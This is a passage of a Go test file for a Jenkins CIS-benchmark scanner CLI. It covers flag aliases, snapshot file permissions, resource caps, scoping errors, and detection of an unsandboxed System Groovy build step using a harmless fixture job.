	if err := os.WriteFile(given, []byte("scan:\n  failOn: none\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	out, _ = runScanCmd(t, "scan", "--snapshot-in", path, "--config", given, "--no-color")
	if !strings.Contains(out, "using config "+given) {
		t.Errorf("a config file given with --config must be named too:\n%s", out)
	}
}

// v0.1 called the format flag --format; the family calls it -o/--output, and the
// report's own closing hint already said "-o json" — which failed. The old
// name still works, says it is deprecated, and cannot silently lose to the
// new one.
func TestOutputFlagAndItsDeprecatedAlias(t *testing.T) {
	path := filepath.Join(t.TempDir(), "s.json")
	snap := `{"schemaVersion":"1","metadata":{"tool":"jenkins-bench","platform":"jenkins"},
		"controller":{"available":{"root":true,"jobs":true}},
		"jobs":[{"fullName":"app","available":{"api":true,"config":false}}]}`
	if err := os.WriteFile(path, []byte(snap), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{{"-o", "json"}, {"--output", "json"}} {
		out, err := runScanCmd(t, append([]string{"scan", "--snapshot-in", path}, args...)...)
		if err != nil || !strings.HasPrefix(strings.TrimSpace(out), "{") {
			t.Errorf("%v: want a JSON report: %v\n%s", args, err, out)
		}
		if strings.Contains(out, "deprecated") {
			t.Errorf("%v is not deprecated:\n%s", args, out)
		}
	}

	out, err := runScanCmd(t, "scan", "--snapshot-in", path, "--format", "json")
	if err != nil {
		t.Fatalf("--format must keep working: %v", err)
	}
	if !strings.Contains(out, "--format is deprecated") || !strings.Contains(out, "-o json") {
		t.Errorf("--format should say it is deprecated and what replaces it:\n%s", out)
	}

	if _, err := runScanCmd(t, "scan", "--snapshot-in", path, "--format", "json", "-o", "sarif"); err == nil {
		t.Error("--format and -o disagreeing must be an error, not a silent choice")
	}
	if _, err := runScanCmd(t, "scan", "--snapshot-in", path, "-c", filepath.Join(t.TempDir(), "missing.yaml")); err == nil {
		t.Error("-c is --config: a missing file must be an error")
	}

	help, _ := runScanCmd(t, "scan", "--help")
	if strings.Contains(help, "--format") {
		t.Errorf("the deprecated alias should be hidden from --help:\n%s", help)
	}
}

// os.WriteFile applies its mode only when it creates the file, so a snapshot
// written over an existing 0644 one stayed world-readable — a map of a
// controller's weak points, readable by every account on the runner.
func TestSnapshotOutTightensAnExistingFile(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("NTFS has no POSIX permission bits")
	}
	srv := controller(t, false)
	path := filepath.Join(t.TempDir(), "snapshot.json")
	if err := os.WriteFile(path, []byte("stale"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(path, 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := runScanCmd(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t", "--snapshot-out", path, "-o", "json"); err != nil {
		t.Fatalf("scan: %v\n%s", err, out)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("snapshot permissions = %o after overwriting a 0644 file, want 600", perm)
	}
	body, _ := os.ReadFile(path)
	if !strings.Contains(string(body), `"schemaVersion"`) {
		t.Errorf("the stale file was not replaced:\n%s", body)
	}
}

// The details view's own footer named --max-resources while no such flag
// existed. It caps the per-resource sections now, and only with --details.
func TestMaxResourcesCapsTheDetailSections(t *testing.T) {
	path := filepath.Join(t.TempDir(), "s.json")
	snap := `{"schemaVersion":"1","metadata":{"tool":"jenkins-bench","platform":"jenkins"},
		"controller":{"available":{"root":true,"jobs":true}},
		"jobs":[{"fullName":"a","available":{"api":true,"config":false}},
		        {"fullName":"b","available":{"api":true,"config":false}},
		        {"fullName":"c","available":{"api":true,"config":false}}]}`
	if err := os.WriteFile(path, []byte(snap), 0o600); err != nil {
		t.Fatal(err)
	}
	out, err := runScanCmd(t, "scan", "--snapshot-in", path, "--details", "--max-resources", "1", "--no-color")
	if err != nil {
		t.Fatalf("scan: %v\n%s", err, out)
	}
	if !strings.Contains(out, "not shown (--max-resources 1)") {
		t.Errorf("the capped sections should be counted:\n%s", out)
	}
	if _, err := runScanCmd(t, "scan", "--snapshot-in", path, "--max-resources", "1"); err == nil ||
		!strings.Contains(err.Error(), "--details") {
		t.Errorf("--max-resources without --details should say what it needs: %v", err)
	}
	if _, err := runScanCmd(t, "scan", "--snapshot-in", path, "--details", "--max-resources", "-1"); err == nil {
		t.Error("a negative cap should be refused")
	}
}

// A freestyle job's System Groovy step runs on the controller with the
// controller's privileges when its sandbox is off — the same exposure CIS-2.1.2
// fails an inline pipeline for — and the control said NA, "no inline pipeline
// script". The shape is what the groovy plugin writes on 2.580.1.
func TestScanJudgesGroovyOutsideThePipelineDefinition(t *testing.T) {
	groovy := func(sandbox string) string {
		return `<?xml version="1.1" encoding="UTF-8"?><project><canRoam>true</canRoam><disabled>false</disabled><triggers/>
			<builders><hudson.plugins.groovy.SystemGroovy plugin="groovy@537.v741a_5a_f1b_581">
			<source class="hudson.plugins.groovy.StringSystemScriptSource"><script plugin="script-security@1429.v0810f1b_530f5">
			<script>println "x"</script><sandbox>` + sandbox + `</sandbox><classpath/></script></source><bindings></bindings>
			</hudson.plugins.groovy.SystemGroovy></builders><publishers/></project>`
	}
	serve := func(body string) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, body) }
	}
	srv := controllerServing(t, false,
		`{"_class":"hudson.model.FreeStyleProject","name":"open","fullName":"open","url":"http://x/"},`+
			`{"_class":"hudson.model.FreeStyleProject","name":"walled","fullName":"walled","url":"http://x/"}`,
		map[string]http.HandlerFunc{
			"/job/open/config.xml":   serve(groovy("false")),
			"/job/walled/config.xml": serve(groovy("true")),
		})
	got, _ := verdicts(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t")
	if got["CIS-2.1.2 open"] != "FAIL" {
		t.Errorf("CIS-2.1.2 open = %q, want FAIL: System Groovy outside the sandbox", got["CIS-2.1.2 open"])
	}
	if got["CIS-2.1.2 walled"] != "PASS" {
		t.Errorf("CIS-2.1.2 walled = %q, want PASS: the job's only script is sandboxed", got["CIS-2.1.2 walled"])
	}
}

// A scoping flag that names nothing on the controller stops the scan with exit
// 2 and the name; the family's rule is never to scan zero things silently.
func TestScanWithAnUnknownTargetExitsTwo(t *testing.T) {
	srv := controller(t, false)
	_, err := runScanCmd(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t", "--folder", "no-such-folder")
	if code := ExitCode(err); code != ExitError {
		t.Fatalf("exit code = %d (%v), want %d", code, err, ExitError)
	}
	if !strings.Contains(err.Error(), "no-such-folder") {
		t.Errorf("the error should name the target: %v", err)
	}

	got, err := verdicts(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t", "--job", "app")
	if err != nil {
		t.Fatalf("--job app: %v", err)
	}
	if got["CIS-2.3.1 app"] != "PASS" {
		t.Errorf("--job app should scan app: %v", got)
	}
}

func TestScopingFlagsAreRefusedWithASnapshot(t *testing.T) {
	path := filepath.Join(t.TempDir(), "s.json")
	if err := os.WriteFile(path, []byte(`{"schemaVersion":"1","metadata":{"platform":"jenkins"},"controller":{"available":{"jobs":true}}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, flag := range []string{"--folder", "--job"} {
		_, err := runScanCmd(t, "scan", "--snapshot-in", path, flag, "platform")
		if err == nil || !strings.Contains(err.Error(), "--snapshot-in") {
			t.Errorf("%s with --snapshot-in should be refused, saying why: %v", flag, err)
		}
	}
}
